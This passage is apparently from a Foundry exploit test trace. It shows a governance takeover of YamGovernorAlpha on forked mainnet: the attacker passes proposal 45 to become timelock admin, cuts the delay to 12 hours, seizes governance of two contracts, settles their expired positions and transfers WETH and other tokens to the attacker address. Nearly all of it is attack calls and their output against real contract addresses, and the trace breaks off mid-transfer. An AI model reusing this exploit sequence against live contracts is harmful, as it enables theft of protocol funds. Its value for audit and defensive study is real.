+    │   │   @ 0x2eb64dace9e373e1977085b49848a1e4396fe576dfe9452fe2fa0c3fe5f8fba6: 0 → 1
+    │   │   @ 0xa6c6349c3cbf6de1bb2823645990a9c2e551e294f036cd90bee9a9954be4c78d: 0 → 65
+    │   │   @ 0x51ba26523841dd49f0c7812d27e8ae3171ba42c410ba1717b18a87c857a732d5: 0 → 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982
+    │   │   @ 0x2eb64dace9e373e1977085b49848a1e4396fe576dfe9452fe2fa0c3fe5f8fba4: 0 → 1
+    │   │   @ 0x2eb64dace9e373e1977085b49848a1e4396fe576dfe9452fe2fa0c3fe5f8fba8: 0 → 0x00000000000000000000000000000000000000000000000000000000018b2974
+    │   │   @ 3: 44 → 45
+    │   │   @ 0x2eb64dace9e373e1977085b49848a1e4396fe576dfe9452fe2fa0c3fe5f8fba3: 0 → 1
+    │   │   @ 0x2eb64dace9e373e1977085b49848a1e4396fe576dfe9452fe2fa0c3fe5f8fba0: 0 → 45
+    │   │   @ 0x2eb64dace9e373e1977085b49848a1e4396fe576dfe9452fe2fa0c3fe5f8fba7: 0 → 0x00000000000000000000000000000000000000000000000000000000018af93b
+    │   └─ ← [Return] 45
+    ├─ emit log_named_uint(key: "proposalId", val: 45)
+    ├─ [0] VM::roll(25884988 [2.588e7])
+    │   └─ ← [Return]
+    ├─ [81766] YamGovernorAlpha::castVote(45, true)
+    │   ├─ [4503] 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521::getPriorVotes(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, 25884987 [2.588e7]) [staticcall]
+    │   │   ├─ [2958] 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521::delegateToImplementation(0x782d6fe100000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf98200000000000000000000000000000000000000000000000000000000018af93b) [staticcall]
+    │   │   │   ├─ [1232] 0x27C5736b49B89d4765d03734a0a51c461F09672d::getPriorVotes(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, 25884987 [2.588e7]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 201664062636824099514174674941 [2.016e29]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000028b9c9a5527a5fe8fd92417fd
+    │   │   └─ ← [Return] 201664062636824099514174674941 [2.016e29]
+    │   ├─ [6168] 0xD67c05523D8ec1c60760Fd017Ef006b9F6e496D0::getPriorVotes(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, 25884987 [2.588e7]) [staticcall]
+    │   │   ├─ [4503] 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521::getPriorVotes(0x0F82E57804D0B1F6FAb2370A43dcFAd3c7cB239c, 25884987 [2.588e7]) [staticcall]
+    │   │   │   ├─ [2958] 0x0AaCfbeC6a24756c20D41914F2caba817C0d8521::delegateToImplementation(0x782d6fe10000000000000000000000000f82e57804d0b1f6fab2370a43dcfad3c7cb239c00000000000000000000000000000000000000000000000000000000018af93b) [staticcall]
+    │   │   │   │   ├─ [1232] 0x27C5736b49B89d4765d03734a0a51c461F09672d::getPriorVotes(0x0F82E57804D0B1F6FAb2370A43dcFAd3c7cB239c, 25884987 [2.588e7]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 53693851944687816149472025684 [5.369e28]
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000ad7e836a60954841f7ae9c54
+    │   │   │   └─ ← [Return] 53693851944687816149472025684 [5.369e28]
+    │   │   └─ ← [Return] 0
+    │   ├─ emit VoteCast(voter: 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, proposalId: 45, support: true, votes: 201664062636824099514174674941 [2.016e29])
+    │   ├─  storage changes:
+    │   │   @ 0xdb3f564a778b9d5d4bf2d8730c2642226652b4658c2e35ee4b635f1116cdb1e2: 0 → 0x00000000000000000000000000000000000000028b9c9a5527a5fe8fd92417fd
+    │   │   @ 0x2eb64dace9e373e1977085b49848a1e4396fe576dfe9452fe2fa0c3fe5f8fba9: 0 → 0x00000000000000000000000000000000000000028b9c9a5527a5fe8fd92417fd
+    │   │   @ 0xdb3f564a778b9d5d4bf2d8730c2642226652b4658c2e35ee4b635f1116cdb1e1: 0 → 257
+    │   └─ ← [Stop]
+    ├─ [369] YamGovernorAlpha::votingPeriod() [staticcall]
+    │   └─ ← [Return] 12345 [1.234e4]
+    ├─ [0] VM::roll(25897334 [2.589e7])
+    │   └─ ← [Return]
+    ├─ [1837] YamGovernorAlpha::state(45) [staticcall]
+    │   └─ ← [Return] 4
+    ├─ [0] VM::assertEq(4, 4, "proposal should be Succeeded") [staticcall]
+    │   └─ ← [Return]
+    ├─ [62022] YamGovernorAlpha::queue(45)
+    │   ├─ [387] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::delay() [staticcall]
+    │   │   └─ ← [Return] 432000 [4.32e5]
+    │   ├─ [2484] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::queuedTransactions(0xda42cfabae6289387c1608716a3e06800cd2901bf172f24927dfa88af532159c) [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   ├─ [26656] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::queueTransaction(0x8b4f1616751117C38a0f84F9A146cca191ea3EC5, 0, "setPendingAdmin(address)", 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982, 1788728399 [1.788e9])
+    │   │   ├─ emit QueueTransaction(txHash: 0xda42cfabae6289387c1608716a3e06800cd2901bf172f24927dfa88af532159c, target: 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5, value: 0, signature: "setPendingAdmin(address)", data: 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982, eta: 1788728399 [1.788e9])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xdda20e2a320d6e3258097850333429fdbf3a90f57f0d71c532391110b059867c: 0 → 1
+    │   │   └─ ← [Return] 0xda42cfabae6289387c1608716a3e06800cd2901bf172f24927dfa88af532159c
+    │   ├─ emit ProposalQueued(id: 45, eta: 1788728399 [1.788e9])
+    │   ├─  storage changes:
+    │   │   @ 0x2eb64dace9e373e1977085b49848a1e4396fe576dfe9452fe2fa0c3fe5f8fba2: 0 → 0x000000000000000000000000000000000000000000000000000000006a9dd44f
+    │   └─ ← [Stop]
+    ├─ [3126] YamGovernorAlpha::state(45) [staticcall]
+    │   ├─ [220] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::GRACE_PERIOD() [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000127500
+    │   └─ ← [Return] 5
+    ├─ [0] VM::assertEq(5, 5, "proposal should be Queued") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::warp(1788728400 [1.788e9])
+    │   └─ ← [Return]
+    ├─ [62172] YamGovernorAlpha::execute(45)
+    │   ├─ [220] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::GRACE_PERIOD() [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000127500
+    │   ├─ [33787] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::executeTransaction(0x8b4f1616751117C38a0f84F9A146cca191ea3EC5, 0, "setPendingAdmin(address)", 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982, 1788728399 [1.788e9])
+    │   │   ├─ [23694] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::setPendingAdmin(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982)
+    │   │   │   ├─ emit NewPendingAdmin(newPendingAdmin: 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 1: 0 → 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit ExecuteTransaction(txHash: 0xda42cfabae6289387c1608716a3e06800cd2901bf172f24927dfa88af532159c, target: 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5, value: 0, signature: "setPendingAdmin(address)", data: 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982, eta: 1788728399 [1.788e9])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xdda20e2a320d6e3258097850333429fdbf3a90f57f0d71c532391110b059867c: 1 → 0
+    │   │   └─ ← [Return] 0x
+    │   ├─ emit ProposalExecuted(id: 45)
+    │   ├─  storage changes:
+    │   │   @ 0x2eb64dace9e373e1977085b49848a1e4396fe576dfe9452fe2fa0c3fe5f8fbab: 0 → 256
+    │   └─ ← [Stop]
+    ├─ [381] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::pendingAdmin() [staticcall]
+    │   └─ ← [Return] 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982
+    ├─ [0] VM::assertEq(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, "attacker should be pendingAdmin after execute") [staticcall]
+    │   └─ ← [Return]
+    ├─ [4720] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::acceptAdmin()
+    │   ├─ emit NewAdmin(newAdmin: 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982)
+    │   ├─  storage changes:
+    │   │   @ 0: 0x0000000000000000000000002da253835967d6e721c6c077157f9c9742934aea → 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982
+    │   │   @ 1: 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982 → 0
+    │   └─ ← [Stop]
+    ├─ [401] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::admin() [staticcall]
+    │   └─ ← [Return] 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982
+    ├─ [0] VM::assertEq(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, "attacker should now be timelock admin") [staticcall]
+    │   └─ ← [Return]
+    ├─ [387] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::delay() [staticcall]
+    │   └─ ← [Return] 432000 [4.32e5]
+    ├─ [28656] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::queueTransaction(0x8b4f1616751117C38a0f84F9A146cca191ea3EC5, 0, "setDelay(uint256)", 0x000000000000000000000000000000000000000000000000000000000000a8c0, 1789160400 [1.789e9])
+    │   ├─ emit QueueTransaction(txHash: 0x662c928c6d79fb52ea293833ef3673902daabe5871cb6c8f93af25bbb669a780, target: 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5, value: 0, signature: "setDelay(uint256)", data: 0x000000000000000000000000000000000000000000000000000000000000a8c0, eta: 1789160400 [1.789e9])
+    │   ├─  storage changes:
+    │   │   @ 0x0baa8538f446f4799f22223b825428b7b619682cbbca09d0df5648d79f245301: 0 → 1
+    │   └─ ← [Return] 0x662c928c6d79fb52ea293833ef3673902daabe5871cb6c8f93af25bbb669a780
+    ├─ [0] VM::warp(1789160401 [1.789e9])
+    │   └─ ← [Return]
+    ├─ [12456] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::executeTransaction(0x8b4f1616751117C38a0f84F9A146cca191ea3EC5, 0, "setDelay(uint256)", 0x000000000000000000000000000000000000000000000000000000000000a8c0, 1789160400 [1.789e9])
+    │   ├─ [4363] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::setDelay(43200 [4.32e4])
+    │   │   ├─ emit NewDelay(newDelay: 43200 [4.32e4])
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 432000 → 43200
+    │   │   └─ ← [Stop]
+    │   ├─ emit ExecuteTransaction(txHash: 0x662c928c6d79fb52ea293833ef3673902daabe5871cb6c8f93af25bbb669a780, target: 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5, value: 0, signature: "setDelay(uint256)", data: 0x000000000000000000000000000000000000000000000000000000000000a8c0, eta: 1789160400 [1.789e9])
+    │   ├─  storage changes:
+    │   │   @ 0x0baa8538f446f4799f22223b825428b7b619682cbbca09d0df5648d79f245301: 1 → 0
+    │   └─ ← [Return] 0x
+    ├─ [387] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::delay() [staticcall]
+    │   └─ ← [Return] 43200 [4.32e4]
+    ├─ [0] VM::assertEq(43200 [4.32e4], 43200 [4.32e4], "delay should be reduced to 12h") [staticcall]
+    │   └─ ← [Return]
+    ├─ [387] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::delay() [staticcall]
+    │   └─ ← [Return] 43200 [4.32e4]
+    ├─ [28656] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::queueTransaction(0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2, 0, "_setPendingGov(address)", 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982, 1789203601 [1.789e9])
+    │   ├─ emit QueueTransaction(txHash: 0xae738e8edf5baf9dac227951995901dbe0605a1fb77d0dd64d54524133f14612, target: 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2, value: 0, signature: "_setPendingGov(address)", data: 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982, eta: 1789203601 [1.789e9])
+    │   ├─  storage changes:
+    │   │   @ 0x961f3f6541362fb653ce463d7a9030e1a5383429ad5e3b21e6828febee820888: 0 → 1
+    │   └─ ← [Return] 0xae738e8edf5baf9dac227951995901dbe0605a1fb77d0dd64d54524133f14612
+    ├─ [0] VM::warp(1789203602 [1.789e9])
+    │   └─ ← [Return]
+    ├─ [32550] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::executeTransaction(0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2, 0, "_setPendingGov(address)", 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982, 1789203601 [1.789e9])
+    │   ├─ [24457] 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2::_setPendingGov(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982)
+    │   │   ├─ emit NewPendingGov(: 0x0000000000000000000000000000000000000000, : 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982)
+    │   │   ├─  storage changes:
+    │   │   │   @ 3: 0 → 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982
+    │   │   └─ ← [Stop]
+    │   ├─ emit ExecuteTransaction(txHash: 0xae738e8edf5baf9dac227951995901dbe0605a1fb77d0dd64d54524133f14612, target: 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2, value: 0, signature: "_setPendingGov(address)", data: 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982, eta: 1789203601 [1.789e9])
+    │   ├─  storage changes:
+    │   │   @ 0x961f3f6541362fb653ce463d7a9030e1a5383429ad5e3b21e6828febee820888: 1 → 0
+    │   └─ ← [Return] 0x
+    ├─ [28656] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::queueTransaction(0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835, 0, "_setPendingGov(address)", 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982, 1789246802 [1.789e9])
+    │   ├─ emit QueueTransaction(txHash: 0x6ba4beda6bbb69fde2dcad531bf0ca4af8c09d9ab77ff8aeb022f45d97ded18e, target: 0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835, value: 0, signature: "_setPendingGov(address)", data: 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982, eta: 1789246802 [1.789e9])
+    │   ├─  storage changes:
+    │   │   @ 0xb12c854e33e9db9b0d1c120dae0e4f18bbf71a23c2d263b5209b7990d02e57ec: 0 → 1
+    │   └─ ← [Return] 0x6ba4beda6bbb69fde2dcad531bf0ca4af8c09d9ab77ff8aeb022f45d97ded18e
+    ├─ [0] VM::warp(1789246803 [1.789e9])
+    │   └─ ← [Return]
+    ├─ [32550] 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5::executeTransaction(0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835, 0, "_setPendingGov(address)", 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982, 1789246802 [1.789e9])
+    │   ├─ [24457] 0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835::_setPendingGov(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982)
+    │   │   ├─ emit NewPendingGov(: 0x0000000000000000000000000000000000000000, : 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982)
+    │   │   ├─  storage changes:
+    │   │   │   @ 3: 0 → 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982
+    │   │   └─ ← [Stop]
+    │   ├─ emit ExecuteTransaction(txHash: 0x6ba4beda6bbb69fde2dcad531bf0ca4af8c09d9ab77ff8aeb022f45d97ded18e, target: 0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835, value: 0, signature: "_setPendingGov(address)", data: 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982, eta: 1789246802 [1.789e9])
+    │   ├─  storage changes:
+    │   │   @ 0xb12c854e33e9db9b0d1c120dae0e4f18bbf71a23c2d263b5209b7990d02e57ec: 1 → 0
+    │   └─ ← [Return] 0x
+    ├─ [5305] 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2::_acceptGov()
+    │   ├─ emit NewGov(: 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5, : 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982)
+    │   ├─  storage changes:
+    │   │   @ 3: 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982 → 0
+    │   │   @ 2: 0x0000000000000000000000008b4f1616751117c38a0f84f9a146cca191ea3ec5 → 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982
+    │   └─ ← [Stop]
+    ├─ [5305] 0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835::_acceptGov()
+    │   ├─ emit NewGov(: 0x8b4f1616751117C38a0f84F9A146cca191ea3EC5, : 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982)
+    │   ├─  storage changes:
+    │   │   @ 2: 0x0000000000000000000000008b4f1616751117c38a0f84f9a146cca191ea3ec5 → 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982
+    │   │   @ 3: 0x00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982 → 0
+    │   └─ ← [Stop]
+    ├─ [453] 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2::gov() [staticcall]
+    │   └─ ← [Return] 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982
+    ├─ [0] VM::assertEq(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, "attacker should be MAR gov") [staticcall]
+    │   └─ ← [Return]
+    ├─ [453] 0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835::gov() [staticcall]
+    │   └─ ← [Return] 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982
+    ├─ [0] VM::assertEq(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, "attacker should be FEB gov") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2534] WETH9::balanceOf(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [2519] 0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828::balanceOf(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [153599] 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2::_settleExpired()
+    │   ├─ [147530] ExpiringMultiParty::settleExpired()
+    │   │   ├─ [2586] 0x40f941E48A552bF496B154Af6bf55725f18D77c3::getImplementationAddress(0x53746f7265000000000000000000000000000000000000000000000000000000) [staticcall]
+    │   │   │   └─ ← [Return] 0x00000000000000000000000054f44ea3d2e7aa0ac089c4d8f7c93c27844057bf
+    │   │   ├─ [9748] 0x54f44eA3D2e7aA0ac089c4d8F7C93C27844057BF::computeRegularFee(1767094727 [1.767e9], 1789246803 [1.789e9], (23922799907286794990 [2.392e19])) [staticcall]
+    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [2556] 0x4e110603e70B0b5f1c403ee543b37e1F1244Cf28::balanceOf(0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit EndedSponsorPosition(sponsor: 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2)
+    │   │   ├─ emit SettleExpiredPosition(caller: 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2, collateralReturned: 23499119440368500920 [2.349e19], tokensBurned: 0)
+    │   │   ├─ [29962] WETH9::transfer(0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2, 23499119440368500920 [2.349e19])
+    │   │   │   ├─ emit Transfer(from: ExpiringMultiParty: [0xfA3AA7EE08399A4cE0B4921c85AB7D645Ccac669], to: 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2, amount: 23499119440368500920 [2.349e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x8588ab5802f32bcfbf4c711095a5e15f6b688d02559bc8e0b8fc7055663220e5: 0 → 0x000000000000000000000000000000000000000000000001461da4a099a400b8
+    │   │   │   │   @ 0x641145300f50078591126c4bed84d5e747a0a889917e87cb071a4e619a1bf505: 0x0000000000000000000000000000000000000000000000014bfedbc46a93c31b → 0x00000000000000000000000000000000000000000000000005e13723d0efc263
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [10098] 0x4e110603e70B0b5f1c403ee543b37e1F1244Cf28::transferFrom(0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2, ExpiringMultiParty: [0xfA3AA7EE08399A4cE0B4921c85AB7D645Ccac669], 0)
+    │   │   │   ├─ emit Transfer(from: 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2, to: ExpiringMultiParty: [0xfA3AA7EE08399A4cE0B4921c85AB7D645Ccac669], amount: 0)
+    │   │   │   ├─ emit Approval(owner: 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2, spender: ExpiringMultiParty: [0xfA3AA7EE08399A4cE0B4921c85AB7D645Ccac669], amount: 115792089237316195423570985008687907853269984665640564038836086895813906822367 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [9825] 0x4e110603e70B0b5f1c403ee543b37e1F1244Cf28::burn(0)
+    │   │   │   ├─ emit Transfer(from: ExpiringMultiParty: [0xfA3AA7EE08399A4cE0B4921c85AB7D645Ccac669], to: 0x0000000000000000000000000000000000000000, amount: 0)
+    │   │   │   └─ ← [Stop]
+    │   │   ├─  storage changes:
+    │   │   │   @ 8: 0x0000000000000000000000000000000000000000000000014d81d8fbf9bbfb9a → 0x00000000000000000000000000000000000000000000000005e811b0031813a5
+    │   │   │   @ 0xad93ee63134d2699ea4a168cb25a01924e14ed9f82fd0c19d52ca9bf3750dfcc: 0x000000000000000000000000000000000000000000000006d379c758a5f7b76e → 0
+    │   │   │   @ 0xad93ee63134d2699ea4a168cb25a01924e14ed9f82fd0c19d52ca9bf3750dfcf: 0x0000000000000000000000000000000000000000000000023b9b1688d525b673 → 0
+    │   │   │   @ 3: 0x000000000000000000000000000000000000000000000000000000006953b9c7 → 0x000000000000000000000000000000000000000000000000000000006aa5bd53
+    │   │   └─ ← [Return] Unsigned({ rawValue: 23499119440368500920 [2.349e19] })
+    │   └─ ← [Stop]
+    ├─ [534] WETH9::balanceOf(0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2) [staticcall]
+    │   └─ ← [Return] 23499119440368500920 [2.349e19]
+    ├─ [2519] 0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828::balanceOf(0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2) [staticcall]
+    │   └─ ← [Return] 763101265318097645247 [7.631e20]
+    ├─ [25155] 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2::masterFallback(WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0xa9059cbb00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf982000000000000000000000000000000000000000000000001461da4a099a400b8)
+    │   ├─ [23162] WETH9::transfer(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, 23499119440368500920 [2.349e19])
+    │   │   ├─ emit Transfer(from: 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2, to: 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, amount: 23499119440368500920 [2.349e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xa228402b359e04d8f215fb9130d204d4363f6e676a7be80cb99633b5c196324d: 0 → 0x000000000000000000000000000000000000000000000001461da4a099a400b8
+    │   │   │   @ 0x8588ab5802f32bcfbf4c711095a5e15f6b688d02559bc8e0b8fc7055663220e5: 0x000000000000000000000000000000000000000000000001461da4a099a400b8 → 0
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop]
+    ├─ [157374] 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2::masterFallback(0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828, 0xa9059cbb00000000000000000000000026881eacc00bcccd7c4ebe14bd7840dd989bf9820000000000000000000000000000000000000000000000295e284db91852eebf)
+    │   ├─ [155381] 0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828::transfer(0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, 763101265318097645247 [7.631e20])
+    │   │   ├─ emit Transfer(from: 0xffb607418dBEaB7A888e079A34Be28A30d8E1DE2, to: 0x26881EacC00Bcccd7c4ebE14BD7840dD989Bf982, amount: 763101265318097645247 [7.631e20])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xe33444aba88d0bc80f52221fb410131c5a733b33de6f69398306c3e78c0ba7b6: 0 → 0x0000000000000000000000000000000000000000000000295e284db91852eebf
+    │   │   │   @ 0xd0baa62c21fdf231c6ef631844af1ae7c8251458b6919236f1924fc8e66a1922: 0 → 142
+    │   │   │   @ 0x46868193465dc00572d7e2fad3b7aebc9e327ed991137fcd69e7c524b2ec5f51: 0 → 142
+    │   │   │   @ 0x8588ab5802f32bcfbf4c711095a5e15f6b688d02559bc8e0b8fc7055663220e5: 1 → 2
+    │   │   │   @ 0xbf3dc71b7b5e8383e30db64250f77e772d33e47630abeba6d43e66003383979b: 0x0000000000000000000000000000000000000000000000295e284db91852eebf → 0
+    │   │   │   @ 0xa228402b359e04d8f215fb9130d204d4363f6e676a7be80cb99633b5c196324d: 0 → 1
+    │   │   │   @ 0x8588ab5802f32bcfbf4c711095a5e15f6b688d02559bc8e0b8fc7055663220e6: 1 → 2
+    │   │   │   @ 0x724c65b177af071cf202855f8f8defd81eb7a9ab8329081b5f295199fdba8a83: 0 → 0x0000000000000000000000000000000000000000000000295e284db91852eebf
+    │   │   │   @ 0xa228402b359e04d8f215fb9130d204d4363f6e676a7be80cb99633b5c196324e: 0 → 1
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop]
+    ├─ [140599] 0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835::_settleExpired()
+    │   ├─ [134530] 0xEAA081a9fad4607CdF046fEA7D4BF3DfEf533282::settleExpired()
+    │   │   ├─ [586] 0x40f941E48A552bF496B154Af6bf55725f18D77c3::getImplementationAddress(0x53746f7265000000000000000000000000000000000000000000000000000000) [staticcall]
+    │   │   │   └─ ← [Return] 0x00000000000000000000000054f44ea3d2e7aa0ac089c4d8f7c93c27844057bf
+    │   │   ├─ [3748] 0x54f44eA3D2e7aA0ac089c4d8F7C93C27844057BF::computeRegularFee(1766520323 [1.766e9], 1789246803 [1.789e9], (25612175931797535403 [2.561e19])) [staticcall]
+    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [2556] 0x81fAb276aEC924fBDe190cf379783526D413CF70::balanceOf(0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit EndedSponsorPosition(sponsor: 0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835)
+    │   │   ├─ emit SettleExpiredPosition(caller: 0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835, collateralReturned: 24586255602921865850 [2.458e19], tokensBurned: 0)
+    │   │   ├─ [29962] WETH9::transfer(0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835, 24586255602921865850 [2.458e19])
+    │   │   │   ├─ emit Transfer(from: 0xEAA081a9fad4607CdF046fEA7D4BF3DfEf533282, to: 0xc0AE1e1e172ECD4C56fD8043FD5Afe5a473E9835, amount: 24586255602921865850 [2.458e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x76dcf67ccb23cdf4d62406f726856ffea21f62d59d891a1e8f99c9e96e1df44b: 0x0000000000000000000000000000000000000000000000016370ba4f9399fb7c → 0x0000000000000000000000000000000000000000000000000e3ccd1a827c7902
